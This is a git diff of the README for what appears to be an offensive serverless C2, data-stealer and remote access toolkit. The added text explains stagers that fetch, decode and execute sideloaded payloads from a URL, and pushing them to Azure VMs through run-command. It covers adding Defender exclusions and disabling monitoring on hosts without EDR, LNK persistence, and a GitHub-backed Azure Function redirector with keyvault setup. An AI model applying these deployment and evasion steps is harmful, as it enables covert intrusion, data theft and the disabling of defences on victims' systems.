@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-   Serverless C2 Agent, Datastealer and Remote Access Toolkit
+   Serverless C2 Agent, Data-Stealer and Remote Access Toolkit
 </p>
 
 <p align="center">
@@ -11,7 +11,9 @@
 </p>
 
 #### Stagers
-Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. 
+Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. noParam for executing over sessions and with Intune, Systemsadrat is good for vm run-command against VMs and Servers, especially those without EDR, will attempt to add a defender exclusion and disable monitoring. Simple stager drops to current folder, 'stager' has conditionals folders (if admin) and commented out exlude/disable defender (if admin). lnkgen for shortcut files. 
+
+***TODO: Stealthy Stager with lnkgen persistence built in.
 
 ##### noparamStager.ps1 - Set the params as vars in the script to make remote execution simple
 ```powershell
@@ -101,17 +103,18 @@ powershell -ep bypass .\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName
 ##### Deploy API, Keyvault and Configure Networking
 Serverless C2 API/redirector is an Azure Function app in C#, requires keyVault and managed Identity or access policy for storing tokens and config values. KeyVault URL is stored in an env var. The API uses a scoped token to your github repo allowing read/write on the contents only. Store it in keyvault as ghToken, need the repoName and username and some other settings stored in the vault. The Function will retrieve what it needs to access github and read/write C2 as agents check in and post results. Bocklist is a good idea but not really implemented anymore. More to come on that.
 
-xHooktoken is your agent's client api key, the other tokens are server-side api keys for registering agents and writing the repo.
+Script will prompt you for values of the secrets needed for redirector. xHooktoken is your agent's client api key, the other tokens are server-side api keys for registering agents and writing the repo, use strong secrets. Make note of them for implementing the agent commands later.
 
 ##### Deploy Keyvault with Secrets
 ```powershell
-$vaultName = ""
-$location = ""
-$groupname = ""
+$vaultName = "serverlessc2"
+$location = "East US"
+$groupname = "serverlessc2"
 
-# will prompt for values of the secrets needed for redirector
 .\Scripts\Gen-KeyVault.ps1 -Vaultname $vaultName -locationname $location -groupname $groupname 
 ```
+
+Local path will be zipped up and deployed to the function app. May make sense to put both the vault and the function in the same resource group.
 
 ##### Deploy the Function App
 ```powershell
@@ -123,6 +126,7 @@ $location = "East US"
 ```
 
 <br>
+
 <!-- ##### Modules -->
 
 <p align="center" style="font-size: 48px; font-weight: bold;">
@@ -144,10 +148,7 @@ base64.exe -n 0 -i .\cloudish.dll -o cloudish.txt
 
 Put processed modules and other DLLs as base64 encoded text files aka 'roadtoken.txt' in 'assets' folder in root of the repo. The /assets/ route can be used to pull down libraries or execute tools, just compile them as dlls and add <Module>.Modes namespace, <moduleName> Class and Execute() method that does what you want. Create a new 'elseif' in the agent's Main method to handle the invocation f the new module and add new method calls as needed.
 
-
-
 ***TODO: Pull the blocklist and user agent blocks from the phishing functions and implement it in this project.
-
 
 <br> 
 
